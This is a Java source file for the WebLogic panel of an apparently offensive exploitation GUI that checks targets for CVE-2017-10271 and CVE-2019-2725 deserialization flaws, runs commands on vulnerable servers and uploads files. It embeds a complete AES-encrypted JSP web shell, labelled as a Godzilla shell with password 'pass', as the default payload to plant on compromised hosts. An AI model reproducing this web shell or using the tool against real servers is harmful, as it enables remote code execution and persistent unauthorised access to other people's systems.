package fun.fireline.controller;

import fun.fireline.core.Constants;
import fun.fireline.core.ExploitInterface;
import fun.fireline.core.VulCheckTask;
import fun.fireline.tools.Tools;
import javafx.fxml.FXML;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;


/**
 * @author yhy
 * @date 2021/7/3 13:15
 * @github https://github.com/yhy0
 */

// JavaFX图形化界面的控制类
public class WeblogicController extends MainController{
    @FXML
    private ChoiceBox<String> choice_cve;
    @FXML
    private ChoiceBox<String> encoding;
    @FXML
    private ChoiceBox<String> platform;
    @FXML
    private TextArea basic_info;
    @FXML
    private TextArea cmd_info;
    @FXML
    private TextField cmd;
    @FXML
    private TextArea upload_info;
    @FXML
    private TextField upload_path;
    @FXML
    private TextArea upload_msg;
    @FXML
    private TextField url;

    private ExploitInterface ei;

    public static String BASICINFO = Constants.SECURITYSTATEMENT +

            "支持检测: \r\n" +
            "\tCVE-2017-10271 Weblogic10 XMLDecoder反序列化: \t \r\n" +
            "\tCVE-2017-10271 Weblogic12 XMLDecoder反序列化: \t \r\n" +
            "\tCVE-2019-2725 Weblogic12 wls9-async反序列化: \t \r\n" +
            "\tCVE-2019-2725 Weblogic10 wls9-async反序列化: \t \r\n" +
            "\tCVE-2019-2725-Bypass Weblogic10 wls9-async反序列化: \t \r\n" +

            "\r\n\t\t\t 相关poc取自 shack2 大佬写Java反序列化漏洞利用工具V1.7" +
            "\t 感谢 https://github.com/shack2/javaserializetools\r\n\r\n\r\n" +

            Constants.UPDATEINFO;

    public static String[] WEBLOGIC = {
            "all",
            "CVE-2017-10271 Weblogic10 XMLDecoder反序列化",
            "CVE-2017-10271 Weblogic12 XMLDecoder反序列化",
            "CVE-2019-2725 Weblogic12 wls9-async反序列化",
            "CVE-2019-2725 Weblogic10 wls9-async反序列化",
            "CVE-2019-2725-Bypass Weblogic10 wls9-async反序列化"
    };

    public static String SHELL = "<%! String xc=\"3c6e0b8a9c15224a\"; String pass=\"pass\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>";



    // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
    public void defaultInformation() {
        this.choice_cve.setValue(WEBLOGIC[0]);
        for (String cve : WEBLOGIC) {
            this.choice_cve.getItems().add(cve);
        }
        this.encoding.setValue(Constants.ENCODING[0]);

        for (String coding : Constants.ENCODING) {
            this.encoding.getItems().add(coding);
        }

        // 默认为冰蝎3 的shell
        this.upload_info.setText(SHELL);
        this.upload_info.setWrapText(true);

        // 命令执行
        this.cmd_info.setText(" ");
        this.cmd_info.setWrapText(true);

        this.upload_msg.setText("默认为 哥斯拉3.03 的shell.jsp , 密码：pass 秘钥：pass");


        this.platform.setValue("Linux");
        this.platform.getItems().add("Linux");
        this.platform.getItems().add("Windows");

    }

    // 基本信息
    public void basic() {
        // 切换界面保留原来的记录
        // 基本信息的历史记录
        if(history.containsKey("WEBLOGIC_url")) {
            this.url.setText((String) history.get("WEBLOGIC_url"));
        }
        if(history.containsKey("WEBLOGIC_vulName")) {
            this.choice_cve.setValue((String) history.get("WEBLOGIC_vulName"));
        }
        if(history.containsKey("WEBLOGIC_ei")) {
            this.ei = (ExploitInterface) history.get("WEBLOGIC_ei");
        }
        if(history.containsKey("WEBLOGIC_basic_info")) {
            this.basic_info.setText((String) history.get("WEBLOGIC_basic_info"));
        } else {
            this.basic_info.setText(BASICINFO);
        }
        this.basic_info.setWrapText(true);

        // 命令执行的历史记录
        if(history.containsKey("WEBLOGIC_cmd")) {
            this.cmd.setText((String) history.get("WEBLOGIC_cmd"));
        }
        if(history.containsKey("WEBLOGIC_encoding")) {
            this.encoding.setValue((String) history.get("WEBLOGIC_encoding"));
        }
        if(history.containsKey("WEBLOGIC_cmd_info")) {
            this.cmd_info.setText((String) history.get("WEBLOGIC_cmd_info"));
        }

        // 文件上传的历史记录
        if(history.containsKey("WEBLOGIC_upload_info")) {
            this.upload_info.setText((String) history.get("WEBLOGIC_upload_info"));
        }
        if(history.containsKey("WEBLOGIC_upload_path")) {
            this.upload_path.setText((String) history.get("WEBLOGIC_upload_path"));
        }
        if(history.containsKey("WEBLOGIC_platform")) {
            this.platform.setValue((String) history.get("WEBLOGIC_platform"));
        }
        if(history.containsKey("WEBLOGIC_upload_msg")) {
            this.upload_msg.setText((String) history.get("WEBLOGIC_upload_msg"));
        }
    }

    // 点击检测，获取url 和 要检测的漏洞
    @FXML
    public void check() {
        String url = Tools.urlParse(this.url.getText().trim());
        history.put("WEBLOGIC_url", this.url.getText());
        String vulName = this.choice_cve.getValue().toString().trim();

        history.put("WEBLOGIC_vulName", this.choice_cve.getValue());

        try {
            if (vulName.equals("all")) {
                this.basic_info.setText("");
                for (String vul : this.choice_cve.getItems()) {
                    if (!vul.equals("all")) {
                        VulCheckTask vulCheckTask = new VulCheckTask(this.url.getText(), vul);
                        vulCheckTask.messageProperty().addListener((observable, oldValue, newValue) -> {
                            this.basic_info.appendText("\t" + newValue + "\r\n\r\n");
                            if(newValue.contains("目标存在")) {
                                this.choice_cve.setValue(vul);
                                this.ei = Tools.getExploit(vul);
                                this.ei.checkVul(url);
                            }
                        });
                        (new Thread(vulCheckTask)).start();
                    }
                }
            } else {
                this.ei = Tools.getExploit(vulName);
                String result = this.ei.checkVul(url);

                this.basic_info.setText("\r\n\t" + result + "\r\n\r\n\twebPath:\r\n\t\t" + this.ei.getWebPath());

            }

        } catch (Exception e) {
            this.basic_info.setText("\r\n\t检测异常 \r\n\t\t\t" + e.toString());
        }

        history.put("WEBLOGIC_ei", this.ei);

        history.put("WEBLOGIC_basic_info", this.basic_info.getText());

    }

    // 命令执行
    @FXML
    public void get_execute_cmd() {
        String cmd = this.cmd.getText();
        String encoding = this.encoding.getValue().toString().trim();

        history.put("WEBLOGIC_cmd", this.cmd.getText());
        history.put("WEBLOGIC_encoding", this.encoding.getValue());

        if(cmd.length() == 0) {
            cmd = "whoami";
        }

        try {
            if(this.ei.isVul()) {
                String result = this.ei.exeCmd(cmd, encoding);
                this.cmd_info.setText(result);

            } else {
                this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在");
            }

        } catch (Exception var4) {
            this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在\r\n");
            this.cmd_info.appendText("error: " + var4.toString());
        }
        history.put("WEBLOGIC_cmd_info", this.cmd_info.getText());
    }


    // 点击上传文件，获取上传的文件信息
    @FXML
    public void get_shell_file() {
        String shell_info = this.upload_info.getText();
        String upload_path = this.upload_path.getText();
        String platform = this.platform.getValue().toString().trim();

        history.put("WEBLOGIC_upload_info", this.upload_info.getText());
        history.put("WEBLOGIC_upload_path", this.upload_path.getText());
        history.put("WEBLOGIC_platform", this.platform.getValue());

        if(upload_path.length() == 0) {
            upload_path = "test.jsp";
        }

        if(shell_info.length() > 0) {
            if(this.ei.isVul()) {
                try {
                    String result = this.ei.uploadFile(shell_info, upload_path, platform);

                    this.upload_msg.setText(result);
                } catch (Exception var4) {
                    this.upload_msg.setText(var4.toString());
                }

            } else {
                this.upload_msg.setText("文件上传失败！");
            }
            history.put("WEBLOGIC_upload_msg", this.upload_msg.getText());
        } else {
            Tools.alert("文件上传", "上传的文件不能为空");
        }

    }

    // 加载
    public void initialize() {
        try {
            this.defaultInformation();
            this.basic();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
